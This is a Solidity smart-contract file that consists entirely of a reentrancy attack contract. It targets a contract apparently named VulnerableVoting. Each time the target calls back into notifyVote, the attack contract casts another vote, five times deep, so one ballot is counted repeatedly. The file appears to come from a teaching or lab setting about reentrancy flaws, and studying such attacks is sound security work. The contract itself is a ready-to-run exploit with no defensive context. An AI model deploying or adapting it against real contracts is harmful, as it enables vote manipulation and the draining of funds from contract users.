// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface VulnerableVoting {
    function vote(uint candidateId) external;
}

contract Attack {
    VulnerableVoting public votingContract;
    // Candidate to vote for
    uint public constant ATTACK_CANDIDATE = 0;
    // Number of reentrant calls
    uint public attackDepth = 5;
    // Tracks recursion depth
    uint public currentDepth = 0;

    constructor(address _votingContract) {
        votingContract = VulnerableVoting(_votingContract);
    }

    // Called by VulnerableVoting, triggers reentrancy
    function notifyVote(uint candidateId) external {
        if (currentDepth < attackDepth) {
            currentDepth++;
            votingContract.vote(ATTACK_CANDIDATE);
        }
    }

    // Initiates the attack
    function attack() public {
        currentDepth = 0;
        votingContract.vote(ATTACK_CANDIDATE);
    }
}